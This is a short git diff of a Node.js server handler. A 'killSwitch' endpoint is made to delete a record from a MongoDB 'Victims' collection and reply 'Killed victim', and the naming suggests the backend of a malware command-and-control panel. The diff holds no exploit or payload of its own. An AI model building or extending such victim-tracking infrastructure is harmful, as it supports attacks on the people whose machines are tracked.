@@ -101,8 +101,26 @@ async function postResult(req, res) {
 	}
 }
 
-function killSwitch(req, res) {
+async function killSwitch(req, res) {
 	const username = req.username;
+
+	if (!username) {
+		return res.send({ status: false, message: "Broken request" });
+	} else { 
+		try {
+			await mongodb.Victims.deleteOne({ victimId: sanitize(username) }).exec();
+			return res
+				.status(200)
+				.send({ status: true, data: "Killed victim" });
+		} catch (e) {
+			console.log(e);
+			return res
+				.status(500)
+				.send({ status: false, data: "Unknown error occured" });
+		}
+		
+	}
+
 }
 
 const refresh = async (req, res) => {
